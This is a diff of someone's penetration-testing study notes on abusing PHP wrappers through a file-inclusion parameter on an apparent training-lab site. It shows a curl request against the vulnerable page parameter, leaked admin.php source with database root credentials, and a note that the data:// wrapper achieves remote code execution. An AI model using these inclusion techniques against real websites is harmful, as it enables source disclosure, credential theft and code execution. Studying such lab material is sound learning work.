@@ -1,5 +1,7 @@
 [XXE - XEE - XML External Entity - HackTricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#php-wrappers)
 
+### PHP FILTER
+
 php://filter displays contents of files with or without encoding
 
 curl http://mountaindesserts.com/meteor/index.php?page=admin.php
@@ -12,7 +14,7 @@ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
         <meta charset="utf-8">
         <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
         <title>Delicious Desserts from the Mountains</title>
-<!--
+
 
 you can convert the base64 code to see the resource to a base 64 string
 
@@ -24,7 +26,7 @@ you can convert the base64 code to see the resource to a base 64 string
         <meta charset="utf-8">
         <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
         <title>Delicious Desserts from the Mountains</title>
-<!--
+
 ![[Pasted image 20230928134014.png]]
 
 
@@ -40,7 +42,7 @@ you can convert the base64 code to see the resource to a base 64 string
 <body>
         <?php echo '<span style="color:#F00;text-align:center;">The admin page is currently under maintenance.'; ?>
 
-<?php
+
 $servername = "localhost";
 $username = "root";
 $password = "M00nK4keCard!2#";
@@ -53,12 +55,8 @@ if ($conn->connect_error) {
   die("Connection failed: " . $conn->connect_error);
 }
 echo "Connected successfully";
-?>
 
-</body>
-</html>
-
-**DATA://**
+### **DATA PHP WRAPPER**
 
 Data:// wrapper can achieve remote code execution
 
